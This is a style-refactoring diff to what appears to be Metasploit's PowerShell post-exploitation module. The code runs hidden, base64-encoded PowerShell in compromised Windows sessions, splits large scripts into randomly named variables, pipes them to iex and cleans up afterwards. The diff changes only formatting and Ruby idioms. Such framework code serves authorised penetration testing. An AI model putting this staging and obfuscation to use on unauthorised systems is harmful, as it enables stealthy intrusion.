@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 # -*- coding: binary -*-
 require 'msf/core/exploit/powershell'
 require 'msf/core/post/common'
@@ -20,7 +21,7 @@ module Msf
                          [true, 'Powershell execution timeout, set < 0 to run async without termination', 15]),
               OptBool.new('Powershell::Post::log_output', [true, 'Write output to log file', false]),
               OptBool.new('Powershell::Post::dry_run', [true, 'Return encoded output to caller', false]),
-              OptBool.new('Powershell::Post::force_wow64', [true, 'Force WOW64 execution', false]),
+              OptBool.new('Powershell::Post::force_wow64', [true, 'Force WOW64 execution', false])
             ], self.class
           )
         end
@@ -90,7 +91,7 @@ module Msf
 
           ps_string = "#{ps_bin} -EncodedCommand #{script} -InputFormat None"
           vprint_good "EXECUTING:\n#{ps_string}"
-          cmd_out = session.sys.process.execute(ps_string, nil, { 'Hidden' => true, 'Channelized' => true })
+          cmd_out = session.sys.process.execute(ps_string, nil, 'Hidden' => true, 'Channelized' => true)
 
           # Subtract prior PIDs from current
           if greedy_kill
@@ -165,55 +166,53 @@ module Msf
         # If the script is larger than 15000 bytes the script will be uploaded in a staged approach
         #
         def stage_psh_env(script)
-          begin
-            ps_script = read_script(script)
-            encoded_expression = encode_script(ps_script)
-            cleanup_commands = []
-            # Add entropy to script variable names
-            script_var = ps_script.rig.generate(4)
-            decscript = ps_script.rig.generate(4)
-            scriptby = ps_script.rig.generate(4)
-            scriptbybase = ps_script.rig.generate(4)
-            scriptbybasefull = ps_script.rig.generate(4)
+          ps_script = read_script(script)
+          encoded_expression = encode_script(ps_script)
+          cleanup_commands = []
+          # Add entropy to script variable names
+          script_var = ps_script.rig.generate(4)
+          decscript = ps_script.rig.generate(4)
+          scriptby = ps_script.rig.generate(4)
+          scriptbybase = ps_script.rig.generate(4)
+          scriptbybasefull = ps_script.rig.generate(4)
 
-            if encoded_expression.size > 14999
-              print_error "Script size: #{encoded_expression.size} This script requires a stager"
-              arr = encoded_expression.chars.each_slice(14999).map(&:join)
-              print_good "Loading #{arr.count} chunks into the stager."
-              vararray = []
-              arr.each_with_index do |slice, index|
-                variable = ps_script.rig.generate(5)
-                vararray << variable
-                indexval = index + 1
-                vprint_good "Loaded stage:#{indexval}"
-                session.shell_command("$#{variable} = \"#{slice}\"")
-                cleanup_commands << "Remove-Variable #{variable} -EA 0"
-              end
-
-              linkvars = ''
-              vararray.each { |var| linkvars << " + $#{var}" }
-              linkvars.slice!(0..2)
-              session.shell_command("$#{script_var} = #{linkvars}")
-
-            else
-              print_good "Script size: #{encoded_expression.size}"
-              session.shell_command("$#{script_var} = \"#{encoded_expression}\"")
+          if encoded_expression.size > 14999
+            print_error "Script size: #{encoded_expression.size} This script requires a stager"
+            arr = encoded_expression.chars.each_slice(14999).map(&:join)
+            print_good "Loading #{arr.count} chunks into the stager."
+            vararray = []
+            arr.each_with_index do |slice, index|
+              variable = ps_script.rig.generate(5)
+              vararray << variable
+              indexval = index + 1
+              vprint_good "Loaded stage:#{indexval}"
+              session.shell_command("$#{variable} = \"#{slice}\"")
+              cleanup_commands << "Remove-Variable #{variable} -EA 0"
             end
 
-            session.shell_command("$#{decscript} = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($#{script_var}))")
-            session.shell_command("$#{scriptby}  = [System.Text.Encoding]::UTF8.GetBytes(\"$#{decscript}\")")
-            session.shell_command("$#{scriptbybase} = [System.Convert]::ToBase64String($#{scriptby}) ")
-            session.shell_command("$#{scriptbybasefull} = ([System.Convert]::FromBase64String($#{scriptbybase}))")
-            session.shell_command("([System.Text.Encoding]::UTF8.GetString($#{scriptbybasefull}))|iex")
-            print_good "Module loaded"
+            linkvars = ''
+            vararray.each { |var| linkvars << " + $#{var}" }
+            linkvars.slice!(0..2)
+            session.shell_command("$#{script_var} = #{linkvars}")
 
-            unless cleanup_commands.empty?
-              vprint_good "Cleaning up #{cleanup_commands.count} stager variables"
-              session.shell_command(cleanup_commands.join(';').to_s)
-            end
-          rescue Errno::EISDIR => e
-            vprint_error "Unable to upload script: #{e.message}"
+          else
+            print_good "Script size: #{encoded_expression.size}"
+            session.shell_command("$#{script_var} = \"#{encoded_expression}\"")
           end
+
+          session.shell_command("$#{decscript} = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($#{script_var}))")
+          session.shell_command("$#{scriptby}  = [System.Text.Encoding]::UTF8.GetBytes(\"$#{decscript}\")")
+          session.shell_command("$#{scriptbybase} = [System.Convert]::ToBase64String($#{scriptby}) ")
+          session.shell_command("$#{scriptbybasefull} = ([System.Convert]::FromBase64String($#{scriptbybase}))")
+          session.shell_command("([System.Text.Encoding]::UTF8.GetString($#{scriptbybasefull}))|iex")
+          print_good "Module loaded"
+
+          unless cleanup_commands.empty?
+            vprint_good "Cleaning up #{cleanup_commands.count} stager variables"
+            session.shell_command(cleanup_commands.join(';').to_s)
+          end
+        rescue Errno::EISDIR => e
+          vprint_error "Unable to upload script: #{e.message}"
         end
 
         #
@@ -241,21 +240,25 @@ module Msf
 
           # Read output until eof or nil return output and write to log
           loop do
-            line = ::Timeout.timeout(read_wait) do
-              cmd_out.channel.read
-            end rescue nil
+            line = begin
+                     ::Timeout.timeout(read_wait) do
+                       cmd_out.channel.read
+                     end
+                   rescue
+                     nil
+                   end
             break if line.nil?
             if line.sub!(/#{eof}/, '')
               results << line
-              fd.write(line) if fd
+              fd&.write(line)
               break
             end
             results << line
-            fd.write(line) if fd
+            fd&.write(line)
           end
 
           # Close log file
-          fd.close if fd
+          fd&.close
 
           results
         end
